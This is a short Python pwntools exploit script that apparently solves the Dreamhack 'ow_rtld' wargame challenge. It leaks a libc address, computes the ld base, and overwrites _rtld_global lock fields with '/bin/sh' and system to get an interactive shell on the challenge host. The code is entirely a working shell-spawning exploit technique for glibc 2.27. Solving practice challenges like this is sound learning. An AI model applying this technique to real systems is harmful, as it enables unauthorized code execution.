from pwn import *

#r = process("./ow_rtld")
r = remote("host3.dreamhack.games", 19525)
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.arch = "amd64"

r.recvuntil(b"stdout: ")
stdout = int(r.recvline()[:-1],16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
ld_base = libc_base + 0x3f1000

_rtld_global = ld_base + ld.symbols["_rtld_global"]
_dl_load_lock = _rtld_global + 2312
_dl_rtld_lock_recursive = _rtld_global + 3840

binsh = next(libc.search(b"/bin/sh")) + libc_base
system = libc.symbols["system"] + libc_base

r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"addr: ", str(_dl_load_lock).encode())
r.sendlineafter(b"data: ", str(u64("/bin/sh\x00")).encode())

r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"addr: ", str(_dl_rtld_lock_recursive).encode())
r.sendlineafter(b"data: ", str(system).encode())

r.sendlineafter(b"> ", b"0")
r.interactive()